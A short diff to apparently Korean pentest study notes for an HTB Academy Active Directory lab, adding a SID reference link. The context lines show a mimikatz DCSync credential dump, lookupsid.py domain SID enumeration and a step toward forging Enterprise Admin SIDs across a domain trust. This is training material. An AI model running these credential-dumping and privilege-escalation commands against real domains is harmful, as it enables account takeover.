@@ -972,6 +972,7 @@ mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
 ```lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240```
 
 ### 도메인 SID 찾기
+- SID 참고 : https://adsecurity.org/?p=1001
 ```lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"```
 
 ### 도메인 SID를 잡고 Enterprise Admin의 RID에 연결
